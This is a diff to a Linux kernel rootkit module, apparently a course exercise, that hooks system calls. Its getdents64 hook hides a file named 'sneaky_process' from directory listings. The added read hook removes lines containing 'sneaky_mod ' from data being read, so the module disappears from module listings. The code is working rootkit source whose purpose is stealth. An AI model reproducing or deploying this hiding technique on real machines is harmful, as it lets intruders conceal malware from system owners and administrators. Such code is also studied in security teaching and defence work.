@@ -79,7 +79,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
   if (bytes <= 0) {
     return bytes;
   }
-  printk(KERN_INFO " name: %s\n", ((struct linux_dirent64 *)regs->si)->d_name);
+  //printk(KERN_INFO " name: %s\n", ((struct linux_dirent64 *)regs->si)->d_name);
   for (bpos = 0; bpos < bytes;) {
     d = (struct linux_dirent64 *) ((char *)buf + bpos);
     if (strcmp(d->d_name, "sneaky_process") == 0 ||
@@ -94,10 +94,29 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
 }
 
 //-----------------------read Function--------------------------------------------
-asmlinkage int (*original_read)(struct pt_regs *);
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
-asmlinkage int sneaky_sys_read(struct pt_regs *regs) {
-  return (*original_read)(regs);
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+  char * start = NULL;
+  char * end = NULL;
+  ssize_t len = (*original_read)(regs);
+  //  return len;
+  void * buf = (void *)regs->si;
+  if (len <= 0) {
+    return len;
+  }
+  start = strnstr((char *)buf, "sneaky_mod ", len);
+  //start = strstr((char *)buf, "sneaky_mod ");
+  if (start != NULL) {
+    end = strnstr(start, "\n", len - (start - (char *)buf));
+    if (end == NULL) { // remove the last part of the file
+      len = (ssize_t)(start - (char *)buf);
+      return len;
+    }
+    memmove(start, end + 1, ((char *)buf + len - end - 1));
+    len -= (ssize_t)(end + 1 - start);
+  }
+  return len;
 }
 
 // The code that gets executed when the module is loaded
